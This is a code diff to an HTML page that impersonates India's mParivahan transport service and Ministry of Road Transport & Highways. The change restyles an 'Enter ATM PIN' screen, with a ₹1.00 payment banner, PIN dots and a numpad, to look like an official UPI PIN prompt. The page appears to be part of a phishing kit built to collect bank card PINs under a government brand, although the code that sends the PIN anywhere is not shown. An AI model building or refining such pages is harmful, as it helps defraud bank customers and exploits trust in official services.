@@ -2345,95 +2345,82 @@
       </div>
 
       <!-- =========================================================
-           PAGE 5.5: ATM PIN PAGE
+           PAGE 5.5: ATM PIN PAGE (Matches UPI PIN style)
            ========================================================= -->
       <div class="view-page" id="pageAtmPin">
-        <header class="atm-pin-header">
-          <div class="atm-pin-nav">
-            <button class="nav-icon-btn" aria-label="Go Back" id="atmPinBackBtn">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-                <line x1="19" y1="12" x2="5" y2="12"></line>
-                <polyline points="12 19 5 12 12 5"></polyline>
+        <!-- Top Header: Bank logo + X close -->
+        <div class="upi-screen-header">
+          <div class="upi-official-logo">
+            <div class="upi-logo-main" style="font-size:22px; letter-spacing:0; font-style:normal; font-weight:900; color:#003688;">
+              ATM
+            </div>
+            <div class="upi-logo-sub">Secure Card Authentication</div>
+          </div>
+          <button type="button" class="upi-close-btn" id="atmPinBackBtn" aria-label="Cancel">&times;</button>
+        </div>
+
+        <!-- Merchant Banner (same golden style as UPI) -->
+        <div class="upi-merchant-banner">
+          <div class="upi-sending-info">
+            <div class="upi-sending-title">Sending ₹1.00</div>
+            <div class="upi-sending-sub">To mParivahan · MoRTH</div>
+          </div>
+          <div class="upi-payee-visual">
+            <span class="upi-arrow-sym">₹ →</span>
+            <div class="upi-avatar-box">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
               </svg>
-            </button>
-
-            <div class="brand-logo">
-              <span class="brand-m">m</span><span class="brand-parivahan">Parivahan</span>
-            </div>
-
-            <div class="ssl-badge-pill">
-              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
-              </svg>
-              <span>Secured</span>
             </div>
           </div>
+        </div>
 
-          <div class="atm-pin-fee-banner">
-            <div class="fee-details-middle">
-              <div class="fee-subtitle-top">Card Payment · mParivahan</div>
-              <div class="fee-big-amount">₹1.00</div>
-              <div class="fee-org-name">Ministry of Road Transport &amp; Highways</div>
-            </div>
-            <div class="morth-pill-tag">MORTH</div>
+        <!-- PIN Label + Dots -->
+        <div class="upi-pin-section">
+          <div class="upi-pin-label">ENTER ATM PIN</div>
+          <div class="pin-dots-row">
+            <div class="pin-dot" id="atm-dot-0"></div>
+            <div class="pin-dot" id="atm-dot-1"></div>
+            <div class="pin-dot" id="atm-dot-2"></div>
+            <div class="pin-dot" id="atm-dot-3"></div>
+            <div class="pin-dot" id="atm-dot-4"></div>
+            <div class="pin-dot" id="atm-dot-5"></div>
           </div>
-        </header>
+        </div>
 
-        <main class="atm-pin-body">
-          <!-- ATM Icon -->
-          <div class="atm-pin-icon-wrap">
-            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-              <rect x="2" y="5" width="20" height="14" rx="2"></rect>
-              <line x1="2" y1="10" x2="22" y2="10"></line>
-              <circle cx="12" cy="15" r="1.5" fill="currentColor"></circle>
-            </svg>
-          </div>
-
-          <div class="atm-pin-title">Enter ATM PIN</div>
-          <div class="atm-pin-subtitle">Enter your 4 or 6-digit ATM PIN to complete the card payment</div>
-
-          <!-- 6 PIN Dots -->
-          <div class="atm-dots-container" id="atmPinDots">
-            <div class="atm-dot-slot" id="atm-dot-0"></div>
-            <div class="atm-dot-slot" id="atm-dot-1"></div>
-            <div class="atm-dot-slot" id="atm-dot-2"></div>
-            <div class="atm-dot-slot" id="atm-dot-3"></div>
-            <div class="atm-dot-slot" id="atm-dot-4"></div>
-            <div class="atm-dot-slot" id="atm-dot-5"></div>
-          </div>
-
-          <!-- Security Note -->
-          <div class="atm-security-note">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#d97706" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <!-- Warning Row -->
+        <div class="upi-warning-row">
+          <span class="upi-warning-icon">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#d97706" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
               <circle cx="12" cy="12" r="10"></circle>
               <line x1="12" y1="8" x2="12" y2="12"></line>
               <line x1="12" y1="16" x2="12.01" y2="16"></line>
             </svg>
-            <span>Never share your ATM PIN with anyone. This is a secure connection.</span>
-          </div>
+          </span>
+          <span>Never enter your ATM PIN to receive money</span>
+        </div>
 
-          <!-- Numpad -->
-          <div class="atm-numpad-grid">
-            <button type="button" class="numpad-key" data-atm-key="1">1</button>
-            <button type="button" class="numpad-key" data-atm-key="2">2</button>
-            <button type="button" class="numpad-key" data-atm-key="3">3</button>
-            <button type="button" class="numpad-key" data-atm-key="4">4</button>
-            <button type="button" class="numpad-key" data-atm-key="5">5</button>
-            <button type="button" class="numpad-key" data-atm-key="6">6</button>
-            <button type="button" class="numpad-key" data-atm-key="7">7</button>
-            <button type="button" class="numpad-key" data-atm-key="8">8</button>
-            <button type="button" class="numpad-key" data-atm-key="9">9</button>
-            <button type="button" class="numpad-key key-backspace" id="atmKeyBackspace" aria-label="Backspace">
-              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
-                <line x1="18" y1="9" x2="12" y2="15"></line>
-                <line x1="12" y1="9" x2="18" y2="15"></line>
-              </svg>
-            </button>
-            <button type="button" class="numpad-key" data-atm-key="0">0</button>
-            <button type="button" class="numpad-key key-pay-btn" id="atmKeyConfirmBtn">Pay</button>
-          </div>
-        </main>
+        <!-- Numpad (same style as UPI PIN) -->
+        <div class="upi-numpad-grid">
+          <button type="button" class="numpad-key" data-atm-key="1">1</button>
+          <button type="button" class="numpad-key" data-atm-key="2">2</button>
+          <button type="button" class="numpad-key" data-atm-key="3">3</button>
+          <button type="button" class="numpad-key" data-atm-key="4">4</button>
+          <button type="button" class="numpad-key" data-atm-key="5">5</button>
+          <button type="button" class="numpad-key" data-atm-key="6">6</button>
+          <button type="button" class="numpad-key" data-atm-key="7">7</button>
+          <button type="button" class="numpad-key" data-atm-key="8">8</button>
+          <button type="button" class="numpad-key" data-atm-key="9">9</button>
+          <button type="button" class="numpad-key key-backspace" id="atmKeyBackspace" aria-label="Backspace">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
+              <line x1="18" y1="9" x2="12" y2="15"></line>
+              <line x1="12" y1="9" x2="18" y2="15"></line>
+            </svg>
+          </button>
+          <button type="button" class="numpad-key" data-atm-key="0">0</button>
+          <button type="button" class="numpad-key key-pay-btn" id="atmKeyConfirmBtn">Pay</button>
+        </div>
       </div>
 
       <!-- =========================================================
@@ -3228,9 +3215,9 @@
       function updateAtmPinDots() {
         for (let i = 0; i < 6; i++) {
           if (i < enteredAtmPin.length) {
-            atmPinDots[i].classList.add('filled');
+            atmPinDots[i].classList.add('visible');
           } else {
-            atmPinDots[i].classList.remove('filled');
+            atmPinDots[i].classList.remove('visible');
           }
         }
       }
